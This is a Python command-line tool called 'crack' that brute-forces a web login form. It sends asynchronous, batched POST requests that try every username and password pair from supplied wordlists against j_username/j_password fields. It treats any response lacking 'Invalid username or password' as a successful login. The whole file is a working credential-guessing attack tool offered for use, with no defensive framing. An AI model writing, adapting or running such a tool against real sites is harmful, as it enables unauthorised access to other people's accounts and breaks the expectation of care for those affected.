#! /bin/python3

from requests import Request, get, post, PreparedRequest
from requests.sessions import Session
import click
from pathlib import Path
import sys
import asyncio
import aiohttp
from aiohttp.client import ClientSession
import asyncio
from functools import wraps
import logging
import timeit
from typing import Generator

logger = logging.getLogger(logging.basicConfig(level=logging.DEBUG))


def coroutine(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        return asyncio.run(f(*args, **kwargs), debug=True)

    return wrapper

@click.command()
@click.argument("url", type=str, required=True)
@click.option("-u", "user", type=str, help="Single known user name")
@click.option("-p", "password", type=str, help="Single known password")
@click.option("-U", "user_list", type=Path, help="List of users to try")
@click.option("-P", "password_list", type=Path, help="List of passwords to try")
@click.option("-b", "batch_size", type=int, help="Number of parallel requests")
@click.option("-t", "threads", type=int, default=8)
@coroutine
async def crack(url:str, user:str, password:str, user_list:Path, password_list:Path, batch_size:int, threads:int):
    _check_inputs(url, user, password, user_list, password_list)
    users = user_list.read_text("latin-1").splitlines() if user_list else [user]
    passwords = password_list.read_text("latin-1").splitlines() if password_list else [password]
    myconn = aiohttp.TCPConnector(limit=10)
    async with ClientSession(connector=myconn) as session:
        async for batch in batched_tasks((asyncio.ensure_future(post_and_check(url, data, session)) for data in permutations(users, passwords)), batch_size):
            results = await asyncio.gather(*batch, return_exceptions=True)
            for result in results:
                if isinstance(result, Exception):
                    raise result
                    

def _check_inputs(url, user, password, user_list, password_list):
    if user and user_list:
        raise ValueError("You cannot specify both '-u' and '-U'")
    if password and password_list:
        raise ValueError("You cannot specify both '-p' and '-P'")
    if not "http" in url:
        raise ValueError("Your url must specify an http ressource")

async def batched_tasks(genexpr:Generator, batch_size):
    batch = []
    while True:
        for _ in range(batch_size):
            try:
                batch.append(next(genexpr))
            except StopIteration:
                yield batch
                return
        yield batch
        batch = []
    

def permutations(users, passwords):
    for user in users:
        for password in passwords:
            yield {"j_username":user,"j_password": password, "Submit":"Sign+in"}
           

async def post_and_check(url, data, session:ClientSession) -> bool:
    async with session.post(url, data=data) as response:
        result = await response.text()
        if "Invalid username or password" not in result:
            logger.info("Successful login for %s", data)
            sys.exit(0)
        logger.debug("Unsuccessful login for %s", data)
    

if __name__ == "__main__":
    start = timeit.default_timer()
    crack()
    end = timeit.default_timer()
    print(f"{end-start} seconds")